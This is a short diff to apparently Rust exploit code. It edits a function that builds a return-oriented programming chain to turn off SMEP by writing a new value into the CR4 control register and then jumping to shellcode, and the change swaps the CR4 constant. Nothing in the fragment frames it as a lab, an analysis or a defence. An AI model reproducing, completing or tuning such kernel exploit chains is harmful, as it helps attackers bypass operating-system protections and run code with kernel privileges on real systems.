@@ -42,7 +42,7 @@ fn build_smep_disable_rop_chain(
     let rop_chain = create_rop_chain!(
         base_offset,
         pop_crx_ret_address,
-        0x250EF8 as u64,
+        0xA50EF8 as u64,
         mov_cr4_crx_ret_address,
         shellcode_address
     );
